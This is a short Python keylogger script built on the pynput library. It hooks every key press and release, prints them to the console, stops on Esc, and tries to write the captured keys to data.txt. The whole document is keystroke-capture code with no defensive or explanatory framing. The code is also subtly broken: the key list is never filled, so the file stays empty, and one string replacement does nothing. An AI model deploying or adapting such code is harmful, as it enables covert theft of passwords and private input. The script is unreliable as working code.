import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    write_file(keys)
    try:
        print("alphanumeric key {0} pressed".format(key.char))
    except AttributeError:
        print("Special key {0} pressed".format(key))

def write_file(keys):
    with open("data.txt","w") as f:
        for key in keys:
            k = str(key).replace("'","'")
            f.write(k)
            f.write(" ")

def on_release(key):
    print("{0} released".format(key))
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as listner:
    listner.join()